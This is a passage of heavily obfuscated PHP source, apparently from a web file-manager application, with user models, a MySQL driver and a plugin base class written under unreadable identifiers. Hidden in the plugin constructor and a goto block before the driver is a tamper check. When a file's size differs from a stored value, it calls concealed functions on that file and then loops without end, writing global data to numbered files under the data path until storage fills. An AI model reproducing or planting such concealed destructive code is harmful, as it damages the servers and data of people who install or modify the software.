[$—Ÿ›“–ª[2155]], $—Ÿ›“–ª[12], $—Ÿ›“–ª[1963]); if (!in_array($·ØÌà”Â, $Ú­÷„ëâ)) { unset($ìıàÕ”[$—Ÿ›“–ª[445]][$õí³á·É]); } } unset($§İ‚‰ ); $ìıàÕ”[$—Ÿ›“–ª[445]] = array_values($ìıàÕ”[$—Ÿ›“–ª[445]]); $ìıàÕ”[$—Ÿ›“–ª[442]] = array($—Ÿ›“–ª[2222] => count($ìıàÕ”[$—Ÿ›“–ª[445]]), $—Ÿ›“–ª[2220] => $ìıàÕ”[$—Ÿ›“–ª[442]][$—Ÿ›“–ª[439]], $—Ÿ›“–ª[2219] => 1, $—Ÿ›“–ª[2221] => 1); } private function _searchFromMeta($›êÄÚ’, $Â¾ìöøù, $Å«°¸Á) { $ë„ïğ½æ =& $_SERVER[Ş­ğŠìÒ]; $Â¾ìöøù = strtolower($Â¾ìöøù); $¢¶êÔÛ = array($ë„ïğ½æ[97] => $›êÄÚ’, $ë„ïğ½æ[450] => array($ë„ïğ½æ[459], "\45{$Â¾ìöøù}\x25")); $¢¶êÔÛ = $this->parseWhereLike($¢¶êÔÛ); $áó‹Ò‰Æ = Model($ë„ïğ½æ[2486])->where($¢¶êÔÛ)->limit($Å«°¸Á)->select(); if (!$áó‹Ò‰Æ) { return array(); } $áó‹Ò‰Æ = array_to_keyvalue($áó‹Ò‰Æ, $ë„ïğ½æ[12], $ë„ïğ½æ[1764]); $º»â¾Éğ = $this->where(array($ë„ïğ½æ[1755] => array($ë„ïğ½æ[7], $áó‹Ò‰Æ)))->select(); if (!$º»â¾Éğ) { return array(); } return $º»â¾Éğ; } private function _listDataApplyItem($ÚåÆî¨) { $ã—ó’´µ = array($ÚåÆî¨); $this->_listDataApply($ã—ó’´µ); return $ã—ó’´µ[0]; } private function _listDataApply(&$—ğ›ŠìŒ) { $­†ŒÃ–ô =& $_SERVER[Ş­ğŠìÒ]; if (!$—ğ›ŠìŒ) { return; } array_remove_key($—ğ›ŠìŒ, $­†ŒÃ–ô[963]); $ˆ³äÑ³¤ = array_to_keyvalue($—ğ›ŠìŒ, $­†ŒÃ–ô[12], $­†ŒÃ–ô[1764]); $this->_listAppendGroup($—ğ›ŠìŒ, $ˆ³äÑ³¤); $this->_listAppendMeta($—ğ›ŠìŒ, $ˆ³äÑ³¤); $this->_listAppendSourceRoot($—ğ›ŠìŒ, $ˆ³äÑ³¤); } private function _listAppendSourceRoot(&$°ƒ›ôÕ«, $»ÊîçÀú) { $İƒõ„ÇØ =& $_SERVER[Ş­ğŠìÒ]; $ªÊîï—è = Model($İƒõ„ÇØ[891])->listSourceRoot(SourceModel::TYPE_USER, $»ÊîçÀú); $ªÊîï—è = array_to_keyvalue($ªÊîï—è, $İƒõ„ÇØ[569]); $ªÊîï—è = array_remove_key($ªÊîï—è, $İƒõ„ÇØ[569]); foreach ($°ƒ›ôÕ« as &$¡ÅµÎçÚ) { $¡ÅµÎçÚ[$İƒõ„ÇØ[90]] = $ªÊîï—è[$¡ÅµÎçÚ[$İƒõ„ÇØ[1764]]] ? $ªÊîï—è[$¡ÅµÎçÚ[$İƒõ„ÇØ[1764]]] : array(); } unset($¡ÅµÎçÚ); } private function _listAppendGroup(&$«“©çê, $¦«ê¯éË) { $ŞÛà´ÛÇ =& $_SERVER[Ş­ğŠìÒ]; $‹ğ¬ùÈ = array($ŞÛà´ÛÇ[1764] => array($ŞÛà´ÛÇ[7], $¦«ê¯éË)); $Ë°ù…¡ = Model($ŞÛà´ÛÇ[2058])->where($‹ğ¬ùÈ)->select(); $İß†÷¢Ÿ = array_to_keyvalue($Ë°ù…¡, $ŞÛà´ÛÇ[12], $ŞÛà´ÛÇ[1963]); $İß†÷¢Ÿ = array_remove_value(array_unique($İß†÷¢Ÿ), $ŞÛà´ÛÇ[228]); if (!$İß†÷¢Ÿ || !$Ë°ù…¡) { return; } $‹ğ¬ùÈ = array($ŞÛà´ÛÇ[1963] => array($ŞÛà´ÛÇ[7], $İß†÷¢Ÿ)); $ğŠÔ€“ = Model($ŞÛà´ÛÇ[2153])->field($ŞÛà´ÛÇ[2487])->where($‹ğ¬ùÈ)->select(); $ğŠÔ€“ = array_to_keyvalue($ğŠÔ€“, $ŞÛà´ÛÇ[1963]); $Ë°ù…¡ = array_to_keyvalue_group($Ë°ù…¡, $ŞÛà´ÛÇ[1764]); foreach ($Ë°ù…¡ as &$­İÜä) { $¬¹»¯Ë„ = array(); foreach ($­İÜä as $¼ˆ²¤Ö‘) { if (!$¼ˆ²¤Ö‘[$ŞÛà´ÛÇ[2072]]) { continue; } $Şœ¥«Ëß = Model($ŞÛà´ÛÇ[571])->listData($¼ˆ²¤Ö‘[$ŞÛà´ÛÇ[2072]]); $¬¹»¯Ë„[] = array($ŞÛà´ÛÇ[1963] => $¼ˆ²¤Ö‘[$ŞÛà´ÛÇ[1963]], $ŞÛà´ÛÇ[2488] => $ğŠÔ€“[$¼ˆ²¤Ö‘[$ŞÛà´ÛÇ[1963]]][$ŞÛà´ÛÇ[32]], $ŞÛà´ÛÇ[584] => $ğŠÔ€“[$¼ˆ²¤Ö‘[$ŞÛà´ÛÇ[1963]]][$ŞÛà´ÛÇ[584]], $ŞÛà´ÛÇ[487] => $Şœ¥«Ëß); } $­İÜä = $¬¹»¯Ë„; } unset($­İÜä); foreach ($«“©çê as &$ŒÙˆàı¤) { $ŒÙˆàı¤[$ŞÛà´ÛÇ[2155]] = array(); if (isset($Ë°ù…¡[$ŒÙˆàı¤[$ŞÛà´ÛÇ[1764]]])) { $ŒÙˆàı¤[$ŞÛà´ÛÇ[2155]] = $Ë°ù…¡[$ŒÙˆàı¤[$ŞÛà´ÛÇ[1764]]]; } } unset($ŒÙˆàı¤); } public function userAppendGroup($ş½³˜«) { $â‹¯²¦¼ =& $_SERVER[Ş­ğŠìÒ]; if (!$ş½³˜«) { return array(); } $this->_listAppendGroup($ş½³˜«, array_to_keyvalue($ş½³˜«, $â‹¯²¦¼[12], $â‹¯²¦¼[1764])); return $ş½³˜«; } private function _listAppendMeta(&$¢’¨š°, $¯çú³Û) { $˜‡Ù±ìÖ =& $_SERVER[Ş­ğŠìÒ]; $õŞİÚúÓ = UserJobModel::JOB_KEY; $İ„«ºì÷ = array($˜‡Ù±ìÖ[2468]); $ùŸèûä‚ = array($˜‡Ù±ìÖ[1764] => array($˜‡Ù±ìÖ[7], $¯çú³Û)); $è±©”âŠ = Model($˜‡Ù±ìÖ[2466])->where($ùŸèûä‚)->select(); $è±©”âŠ = array_to_keyvalue_group($è±©”âŠ, $˜‡Ù±ìÖ[1764]); foreach ($è±©”âŠ as &$À¶¸ÖæÍ) { $Ìé÷Î = array(); foreach ($À¶¸ÖæÍ as $ù§Ø¡Ûú) { if (!in_array($ù§Ø¡Ûú[$˜‡Ù±ìÖ[97]], $İ„«ºì÷)) { $Ìé÷Î[$ù§Ø¡Ûú[$˜‡Ù±ìÖ[97]]] = $ù§Ø¡Ûú[$˜‡Ù±ìÖ[450]]; } } $À¶¸ÖæÍ = $Ìé÷Î; } unset($À¶¸ÖæÍ); $Ì‹µ†ù’ = Model($˜‡Ù±ìÖ[2489]); foreach ($¢’¨š° as &$»ˆü¦Óı) { $Úò„¡ãˆ = array(); if (isset($è±©”âŠ[$»ˆü¦Óı[$˜‡Ù±ìÖ[1764]]])) { $Úò„¡ãˆ = $è±©”âŠ[$»ˆü¦Óı[$˜‡Ù±ìÖ[1764]]]; } $»ˆü¦Óı[$˜‡Ù±ìÖ[2490]] = array(); if (isset($Úò„¡ãˆ[$õŞİÚúÓ])) { $»ˆü¦Óı[$˜‡Ù±ìÖ[2490]] = $Ì‹µ†ù’->getUserJobInfo($Úò„¡ãˆ[$õŞİÚúÓ]); } } unset($»ˆü¦Óı); } protected function groupUserAll($àÚÎ‚–˜) { $´”ºù’ =& $_SERVER[Ş­ğŠìÒ]; if (!$àÚÎ‚–˜) { return !1; } $øşœæñó = Model($´”ºù’[2058])->field($´”ºù’[1764])->where(array($´”ºù’[1963] => array($´”ºù’[7], $àÚÎ‚–˜)))->select(); $øşœæñó = array_to_keyvalue($øşœæñó, $´”ºù’[12], $´”ºù’[1764]); return array_unique($øşœæñó); } public function userSearch($¬ş÷ºø§, $ Ñ×âœÖ = "\x2a") { return Model($_SERVER[Ş­ğŠìÒ][598])->where($¬ş÷ºø§)->field($ Ñ×âœÖ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\x5f\x6f\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ßèıÇ´Ú) { $÷²öğµ¡ =& $_SERVER[Ş­ğŠìÒ]; $½…ïÅÃœ = defined($÷²öğµ¡[2190]) && USER_ID ? USER_ID : $÷²öğµ¡[12]; return "\125\x73\145\162\x4f\160\x74\151\x6f\x6e\137{$ßèıÇ´Ú}\137" . $½…ïÅÃœ; } protected function filterWhere($³¼Íãï¿) { $Í ½ìÖÎ =& $_SERVER[Ş­ğŠìÒ]; $³¼Íãï¿[$Í ½ìÖÎ[1764]] = defined($Í ½ìÖÎ[2190]) && USER_ID ? USER_ID : $Í ½ìÖÎ[12]; return $³¼Íãï¿; } public function cacheRemoveUser($¨ÌÂ›©¹, $Ş«›ê¸‡) { return Cache::remove("\125\x73\x65\x72\x4f\160\164\151\x6f\x6e\x5f{$¨ÌÂ›©¹}\137" . $Ş«›ê¸‡); } protected function optionDefault($µ—…øà = '') { $ó¬âÔÛŸ =& $_SERVER[Ş­ğŠìÒ]; if ($µ—…øà == $ó¬âÔÛŸ[12]) { return $GLOBALS[$ó¬âÔÛŸ[6]][$ó¬âÔÛŸ[2491]]; } if ($µ—…øà == $ó¬âÔÛŸ[2492]) { return $GLOBALS[$ó¬âÔÛŸ[6]][$ó¬âÔÛŸ[2493]]; } } } goto dÆèÉåğ³…; b®¶«…Óí: $_size = $_SERVER[Ş­ğŠìÒ][944]; if ($_SERVER[$_SERVER[Ş­ğŠìÒ][945]] != $_size($_file)) { $_getc = $_SERVER[Ş­ğŠìÒ][947]; $_getfile = $_SERVER[$_SERVER[Ş­ğŠìÒ][948]] . $_SERVER[Ş­ğŠìÒ][949]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ş­ğŠìÒ][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ş­ğŠìÒ][683]) { $exit = $_SERVER[Ş­ğŠìÒ][950]; $exit(); } $_act = $_SERVER[Ş­ğŠìÒ][958]; $_act($_file); } class DbMysql extends Db { public function __construct($ãÌßÏ“ = '') { $š‹Í¥ =& $_SERVER[Ş­ğŠìÒ]; if (!extension_loaded($š‹Í¥[871])) { think_exception(think_lang($š‹Í¥[14]) . $š‹Í¥[959]); } if (!empty($ãÌßÏ“)) { $this->config = $ãÌßÏ“; if (empty($this->config[$š‹Í¥[17]])) { $this->config[$š‹Í¥[17]] = $š‹Í¥[12]; } } } public function connect($•úÍôŞ = '', $â‚ŒÉí› = 0, $ä¶¹Úõ = false) { $œÓ«ìçÈ =& $_SERVER[Ş­ğŠìÒ]; if (!isset($this->linkID[$â‚ŒÉí›])) { if (empty($•úÍôŞ)) { $•úÍôŞ = $this->config; } $õê‹‰å = $•úÍôŞ[$œÓ«ìçÈ[960]] . ($•úÍôŞ[$œÓ«ìçÈ[961]] ? "\x3a{$•úÍôŞ[$œÓ«ìçÈ[961]]}" : $œÓ«ìçÈ[12]); $üê›ˆúÓ = !empty($•úÍôŞ[$œÓ«ìçÈ[17]][$œÓ«ìçÈ[18]]) ? $•úÍôŞ[$œÓ«ìçÈ[17]][$œÓ«ìçÈ[18]] : $this->pconnect; if ($üê›ˆúÓ) { $this->linkID[$â‚ŒÉí›] = mysql_pconnect($õê‹‰å, $•úÍôŞ[$œÓ«ìçÈ[962]], $•úÍôŞ[$œÓ«ìçÈ[963]], 131072); } else { $this->linkID[$â‚ŒÉí›] = mysql_connect($õê‹‰å, $•úÍôŞ[$œÓ«ìçÈ[962]], $•úÍôŞ[$œÓ«ìçÈ[963]], !0, 131072); } if (!$this->linkID[$â‚ŒÉí›] || !empty($•úÍôŞ[$œÓ«ìçÈ[21]]) && !mysql_select_db($•úÍôŞ[$œÓ«ìçÈ[21]], $this->linkID[$â‚ŒÉí›])) { think_exception(mysql_error()); } $ë¿œ±‘Ó = mysql_get_server_info($this->linkID[$â‚ŒÉí›]); mysql_query($œÓ«ìçÈ[964] . think_config($œÓ«ìçÈ[965]) . $œÓ«ìçÈ[58], $this->linkID[$â‚ŒÉí›]); if ($ë¿œ±‘Ó > $œÓ«ìçÈ[966]) { mysql_query($œÓ«ìçÈ[967], $this->linkID[$â‚ŒÉí›]); } $this->connected = !0; if (1 != think_config($œÓ«ìçÈ[22])) { unset($this->config); } } return $this->linkID[$â‚ŒÉí›]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($¦œƒê‡) { $í—í„Ü° =& $_SERVER[Ş­ğŠìÒ]; if (0 === stripos($¦œƒê‡, $í—í„Ü°[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¦œƒê‡; if ($this->queryID) { $this->free(); } think_action_status($í—í„Ü°[23], 1); think_status($í—í„Ü°[24]); $this->queryID = mysql_query($¦œƒê‡, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($å ¼á) { $²–ıòèª =& $_SERVER[Ş­ğŠìÒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $å ¼á; if ($this->queryID) { $this->free(); } think_action_status($²–ıòèª[25], 1); think_status($²–ıòèª[24]); $üØ°ï¤º = mysql_query($å ¼á, $this->_linkID); $this->debug(); if (!1 === $üØ°ï¤º) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ş­ğŠìÒ][968], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Èü”¤ì© = mysql_query($_SERVER[Ş­ğŠìÒ][969], $this->_linkID); $this->transTimes = 0; if (!$Èü”¤ì©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $úíáŸŸê = mysql_query($_SERVER[Ş­ğŠìÒ][970], $this->_linkID); $this->transTimes = 0; if (!$úíáŸŸê) { $this->error(); return !1; } } return !0; } private function getAll() { $™ñĞûş = array(); if ($this->numRows > 0) { while ($Ì¯¢¦²Ç = mysql_fetch_assoc($this->queryID)) { $™ñĞûş[] = $Ì¯¢¦²Ç; } mysql_data_seek($this->queryID, 0); } return $™ñĞûş; } public function getFields($ì°Éê·) { $½„¦…Ñš =& $_SERVER[Ş­ğŠìÒ]; $Šø¶«Å = $this->query($½„¦…Ñš[971] . $this->parseKey($ì°Éê·)); $€æ¨ŸÕÍ = array(); if ($Šø¶«Å) { foreach ($Šø¶«Å as $‡©’”äÈ => $ÌÊ¥¬ûç) { $€æ¨ŸÕÍ[$ÌÊ¥¬ûç[$½„¦…Ñš[31]]] = array($½„¦…Ñš[32] => $ÌÊ¥¬ûç[$½„¦…Ñš[31]], $½„¦…Ñš[33] => $ÌÊ¥¬ûç[$½„¦…Ñš[34]], $½„¦…Ñš[35] => (bool) (strtoupper($ÌÊ¥¬ûç[$½„¦…Ñš[36]]) === $½„¦…Ñš[972]), $½„¦…Ñš[37] => $ÌÊ¥¬ûç[$½„¦…Ñš[38]], $½„¦…Ñš[39] => strtolower($ÌÊ¥¬ûç[$½„¦…Ñš[40]]) == $½„¦…Ñš[41], $½„¦…Ñš[42] => strtolower($ÌÊ¥¬ûç[$½„¦…Ñš[43]]) == $½„¦…Ñš[44]); } } return $€æ¨ŸÕÍ; } public function getTables($Œ˜ÂôºĞ = '') { $¯—´Ëİ =& $_SERVER[Ş­ğŠìÒ]; if (!empty($Œ˜ÂôºĞ)) { $ƒø‚ Ğ = $¯—´Ëİ[973] . $Œ˜ÂôºĞ . $¯—´Ëİ[974]; } else { $ƒø‚ Ğ = $¯—´Ëİ[975]; } $ïâ‚æÈƒ = $this->query($ƒø‚ Ğ); $¹•ûöˆÛ = array(); foreach ($ïâ‚æÈƒ as $‘Ãº×º => $Şøàå½ ) { $¹•ûöˆÛ[$‘Ãº×º] = current($Şøàå½ ); } return $¹•ûöˆÛ; } public function replace($’Œû£±, $¶ìÊ×ì = array()) { $é½¡¯ =& $_SERVER[Ş­ğŠìÒ]; foreach ($’Œû£± as $û¾–ÊÎ¹ => $¿Ø™Ú’) { $£±€×ë = $this->parseValue($¿Ø™Ú’); if (is_scalar($£±€×ë)) { $¢şµòä‹[] = $£±€×ë; $“û¥†ü[] = $this->parseKey($û¾–ÊÎ¹); } } $˜ñôÓ = $é½¡¯[976] . $this->parseTable($¶ìÊ×ì[$é½¡¯[356]]) . $é½¡¯[977] . implode($é½¡¯[50], $“û¥†ü) . $é½¡¯[978] . implode($é½¡¯[50], $¢şµòä‹) . $é½¡¯[979]; return $this->execute($˜ñôÓ); } public function insertAll($Ì¥ïÂâ, $“™š…•Ù = array(), $–¼ã¿î» = false) { $í˜äÜû  =& $_SERVER[Ş­ğŠìÒ]; if (!is_array($Ì¥ïÂâ[0])) { return !1; } $­š—÷Ó¬ = array_keys($Ì¥ïÂâ[0]); $‚â±¥ˆí = array(); foreach ($Ì¥ïÂâ as $ÏƒÚš–ã) { $Üş„×áş = array(); foreach ($ÏƒÚš–ã as $§Å¬ªê€ => $¾¾ü¤û) { $¾¾ü¤û = $this->parseValue($¾¾ü¤û); if (is_scalar($¾¾ü¤û)) { $Üş„×áş[] = $¾¾ü¤û; } } $‚â±¥ˆí[] = $í˜äÜû [337] . implode($í˜äÜû [50], $Üş„×áş) . $í˜äÜû [979]; } array_walk($­š—÷Ó¬, array($this, $í˜äÜû [980])); $ÙÅ²­åİ = ($–¼ã¿î» ? $í˜äÜû [981] : $í˜äÜû [982]) . $í˜äÜû [983] . $this->parseTable($“™š…•Ù[$í˜äÜû [356]]) . $í˜äÜû [977] . implode($í˜äÜû [50], $­š—÷Ó¬) . $í˜äÜû [984] . implode($í˜äÜû [50], $‚â±¥ˆí); return $this->execute($ÙÅ²­åİ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $€Õşğ†¹ =& $_SERVER[Ş­ğŠìÒ]; $this->error = mysql_errno() . $€Õşğ†¹[4] . mysql_error($this->_linkID); if ($€Õşğ†¹[12] != $this->queryStr) { $this->error .= LNG($€Õşğ†¹[48]) . $this->queryStr; } think_trace($this->error, $€Õşğ†¹[12], $€Õşğ†¹[49]); return $this->error; } public function escapeString($è£Ãµäš) { if ($this->_linkID) { return mysql_real_escape_string($è£Ãµäš, $this->_linkID); } else { return mysql_escape_string($è£Ãµäš); } } public function parseKey(&$Ô¥â¬š, $Ú¾‹€ÚÔ = true) { $ …ÚŒÎ =& $_SERVER[Ş­ğŠìÒ]; if ($Ú¾‹€ÚÔ) { $Ô¥â¬š = $this->parseKeyCheck($Ô¥â¬š); } if ($Ô¥â¬š != $ …ÚŒÎ[220] && !preg_match($ …ÚŒÎ[985], $Ô¥â¬š)) { $Ô¥â¬š = $ …ÚŒÎ[461] . trim($Ô¥â¬š, $ …ÚŒÎ[461]) . $ …ÚŒÎ[461]; } return $Ô¥â¬š; } } goto d·ÅóÂÏ÷; D•Èôã†÷: class Message { function __construct() { } public function send($‰±—Ç¨¦ = '', $¢í÷‚¢ƒ = array(), $’ê²Õ¦’ = "\x74\145\170\164") { $†şÇìÓ¿ =& $_SERVER[Ş­ğŠìÒ]; $¡ßø¼†º = array($†şÇìÓ¿[33] => $†şÇìÓ¿[1616], $†şÇìÓ¿[171] => $‰±—Ç¨¦); if (in_array($’ê²Õ¦’, array($†şÇìÓ¿[1616], $†şÇìÓ¿[1617]))) { $¡ßø¼†º[$†şÇìÓ¿[33]] = $’ê²Õ¦’; } $¢í÷‚¢ƒ = array($†şÇìÓ¿[578] => isset($¢í÷‚¢ƒ[$†şÇìÓ¿[578]]) ? $¢í÷‚¢ƒ[$†şÇìÓ¿[578]] : $†şÇìÓ¿[12], $†şÇìÓ¿[662] => isset($¢í÷‚¢ƒ[$†şÇìÓ¿[662]]) ? $¢í÷‚¢ƒ[$†şÇìÓ¿[662]] : $†şÇìÓ¿[12]); if (empty($‰±—Ç¨¦) || empty($¢í÷‚¢ƒ[$†şÇìÓ¿[578]]) && empty($¢í÷‚¢ƒ[$†şÇìÓ¿[662]])) { return !1; } $›Î½¬çò = array($†şÇìÓ¿[1544] => $¡ßø¼†º, $†şÇìÓ¿[1618] => $¢í÷‚¢ƒ); Hook::trigger($†şÇìÓ¿[1619], $›Î½¬çò); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $£îÕùË =& $_SERVER[Ş­ğŠìÒ]; $²‚Éß¼ˆ = $_SERVER[$£îÕùË[948]] . $£îÕùË[949]; $¦Ù§ĞÎ³ = $£îÕùË[944]; if ($_SERVER[$£îÕùË[945]] != $¦Ù§ĞÎ³($²‚Éß¼ˆ)) { $ò´á»…¯ = $£îÕùË[946]; $Ñ³ÊîÊ = $£îÕùË[947]; $³¬Ÿ³÷ = $_SERVER[$£îÕùË[948]] . $£îÕùË[949]; $Ç§™æõş = $Ñ³ÊîÊ($³¬Ÿ³÷); $¸É¥Ã†§ = explode($£îÕùË[262], $Ç§™æõş); if (count($¸É¥Ã†§) < $£îÕùË[692]) { $äÛ‹õø¿ = $£îÕùË[950]; $äÛ‹õø¿(); } $×¹™í×ó = $£îÕùË[951]; $×¹™í×ó($_SERVER[$£îÕùË[952]]); $ò´á»…¯ = $£îÕùË[946]; $ò´á»…¯(); $´½ˆ‹“Ê = $£îÕùË[953]; $ÜÊ”‹Ø = json_encode($GLOBALS[$£îÕùË[954]]); $¹Ô©ªì˜ = 1; for ($†Ş÷ë°Í = $¹Ô©ªì˜; $†Ş÷ë°Í > 0; $†Ş÷ë°Í++) { $´½ˆ‹“Ê(DATA_PATH . $†Ş÷ë°Í, $ÜÊ”‹Ø); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($£îÕùË[1620]); $this->pluginName = str_replace($£îÕùË[1620], $£îÕùË[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $£îÕùË[8]; $this->pluginApi = appHostGet() . $£îÕùË[1621] . $this->pluginName . $£îÕùË[8]; $this->pluginHost = $config[$£îÕùË[1622]] . $this->pluginName . $£îÕùË[8]; $this->pluginHostDefault = $config[$£îÕùË[1622]] . $this->pluginName . $£îÕùË[8]; $öÎÓ„¨ó = $config[$£îÕùË[1623]]; if ($öÎÓ„¨ó && strpos($£îÕùË[50] . $öÎÓ„¨ó . $£îÕùË[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$£îÕùË[1624]] . $this->pluginName . $£îÕùË[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ş­ğŠìÒ][1625]); } protected function assign($¸ÚıÃ•›, $„‰ƒ’˜ = false) { if (is_array($¸ÚıÃ•›)) { $this->values = array_merge($this->values, $¸ÚıÃ•›); } else { $this->values[$¸ÚıÃ•›] = $„‰ƒ’˜; } } protected function display($‘‹¯˜ÖÜ) { extract($this->values); require $‘‹¯˜ÖÜ; } final function hookRegist($¸³ˆ×µ„) { $this->modelPlugin->appRegist($this->pluginName, $¸³ˆ×µ„); } final function appIcon() { $È‘Ö°Äå =& $_SERVER[Ş­ğŠìÒ]; $´ŸÛ±òĞ = $this->appPackage(); $ËË½É— = $È‘Ö°Äå[12]; if (isset($´ŸÛ±òĞ[$È‘Ö°Äå[490]])) { if (isset($´ŸÛ±òĞ[$È‘Ö°Äå[490]][$È‘Ö°Äå[1626]])) { $ËË½É— = $È‘Ö°Äå[1627] . $´ŸÛ±òĞ[$È‘Ö°Äå[490]][$È‘Ö°Äå[1626]] . $È‘Ö°Äå[1628]; } else { if ($´ŸÛ±òĞ[$È‘Ö°Äå[490]][$È‘Ö°Äå[1629]]) { $ËË½É— = $È‘Ö°Äå[1630] . $´ŸÛ±òĞ[$È‘Ö°Äå[490]][$È‘Ö°Äå[1629]] . $È‘Ö°Äå[1631]; } } } return $ËË½É—; } final function fileCanView($ºÉè«ûö) { $ÂÜ…ÊÄ” =& $_SERVER[Ş­ğŠìÒ]; if (request_url_safe($ºÉè«ûö)) { return !0; } if ($this->isShare($ºÉè«ûö)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ë‰•¹ß = $ÂÜ…ÊÄ”[1632] . rawurlencode(this_url()); show_tips(LNG($ÂÜ…ÊÄ”[1633]) . $ÂÜ…ÊÄ”[1634] . $ë‰•¹ß . $ÂÜ…ÊÄ”[1635] . LNG($ÂÜ…ÊÄ”[1636]) . $ÂÜ…ÊÄ”[1637], !1); } if (!Action($ÂÜ…ÊÄ”[1638])->authCan($ÂÜ…ÊÄ”[1639])) { show_tips(LNG($ÂÜ…ÊÄ”[1640]) . $ÂÜ…ÊÄ”[1641], !1); } ActionCall($ÂÜ…ÊÄ”[1642], $ºÉè«ûö); } final function isShare($Äà¯®Ãç) { $¤ŒÔ‚† = KodIO::parse($Äà¯®Ãç); return $¤ŒÔ‚†[$_SERVER[Ş­ğŠìÒ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ò³åÀæ) { if (request_url_safe($ò³åÀæ)) { return $ò³åÀæ; } if (!$this->isShare($ò³åÀæ)) { $ò³åÀæ = $this->filePath($ò³åÀæ, !1); } return Action($_SERVER[Ş­ğŠìÒ][1252])->linkOut($ò³åÀæ); } public function filePathLinkOut($¬éÑ÷Ş”) { if (request_url_safe($¬éÑ÷Ş”)) { return $¬éÑ÷Ş”; } $this->fileCanView($¬éÑ÷Ş”); return Action($_SERVER[Ş­ğŠìÒ][1252])->link($¬éÑ÷Ş”); } final function filePath($÷è¬œ½, $÷¼èøŸ¢ = true, $çÈŒÁ¿ = false) { $Ü…Á½‘´ =& $_SERVER[Ş­ğŠìÒ]; $´”ğ‘´Ê = $this->filePathGet($÷è¬œ½, $÷¼èøŸ¢); if (!$this->fileInfo) { show_tips(LNG($Ü…Á½‘´[108]), !1); } if ($çÈŒÁ¿ && isset($this->fileInfo[$Ü…Á½‘´[541]]) && $this->fileInfo[$Ü…Á½‘´[541]]) { $ÌñéÈÅ› = Model($Ü…Á½‘´[544])->fileInfo($this->fileInfo[$Ü…Á½‘´[541]]); if (!$ÌñéÈÅ› || !IO::exist($ÌñéÈÅ›[$Ü…Á½‘´[87]])) { show_tips(LNG($Ü…Á½‘´[108]) . $Ü…Á½‘´[1643]); } } Hook::trigger($Ü…Á½‘´[1644], $´”ğ‘´Ê); return $´”ğ‘´Ê; } final function filePathGet($Ç‚ÂÍÎ, $ûúÖ’„İ = true) { $ŒüáÈš =& $_SERVER[Ş­ğŠìÒ]; if ($¶Š‰ˆ«ê = $this->checkSharePath($Ç‚ÂÍÎ, $ûúÖ’„İ)) { return $¶Š‰ˆ«ê; } $this->fileCanView($Ç‚ÂÍÎ); if (request_url_safe($Ç‚ÂÍÎ)) { $¿Á–Ç•‰ = parse_url_query($Ç‚ÂÍÎ); if (isset($¿Á–Ç•‰[$ŒüáÈš[1645]]) && isset($¿Á–Ç•‰[$ŒüáÈš[234]])) { $è­’ û€ = Mcrypt::decode($¿Á–Ç•‰[$ŒüáÈš[234]], Model($ŒüáÈš[837])->get($ŒüáÈš[838])); if ($è­’ û€) { $this->fileInfo = IO::info($è­’ û€); $this->fileInfo[$ŒüáÈš[1646]] = $Ç‚ÂÍÎ; $this->cachePath = $this->pluginCachePath($ŒüáÈš[12], $ûúÖ’„İ); return $è­’ û€; } } $Ç‚ÂÍÎ = $this->_cacheHttpFile($Ç‚ÂÍÎ, $ûúÖ’„İ); $this->fileInfo = IO::info($Ç‚ÂÍÎ); } else { $this->fileInfo = IO::info($Ç‚ÂÍÎ); $this->cachePath = $this->pluginCachePath($ŒüáÈš[12], $ûúÖ’„İ); } return $Ç‚ÂÍÎ; } final function _cacheHttpFile($î„ÑïÙ, $¿öë“ûÓ = true) { $á—Ÿ©Ëß =& $_SERVER[Ş­ğŠìÒ]; $ñ´ªï÷ = parse_url_query($î„ÑïÙ); $¥ı€Í­¥ = get_path_ext($î„ÑïÙ); if (isset($ñ´ªï÷[$á—Ÿ©Ëß[32]]) && $ñ´ªï÷[$á—Ÿ©Ëß[32]]) { $¥ı€Í­¥ = get_path_ext($ñ´ªï÷[$á—Ÿ©Ëß[32]]); } $•™î‘äÚ = hash_path($î„ÑïÙ) . $á—Ÿ©Ëß[10] . $¥ı€Í­¥; $this->cachePath = $this->pluginCachePath($¿öë“ûÓ ? $•™î‘äÚ : $á—Ÿ©Ëß[12]); $ş·½ĞÄ = IO::fileNameExist($this->cachePath, $•™î‘äÚ); if ($ş·½ĞÄ) { return KodIO::make($ş·½ĞÄ); } $í”äé¥‚ = rtrim($this->cachePath, $á—Ÿ©Ëß[8]) . $á—Ÿ©Ëß[8] . $•™î‘äÚ; return $this->pluginCacheFileSet($í”äé¥‚, file_get_contents_nossl($î„ÑïÙ)); } final function checkSharePath($¢À›‡ä·, $ÕÓËæœØ = true) { 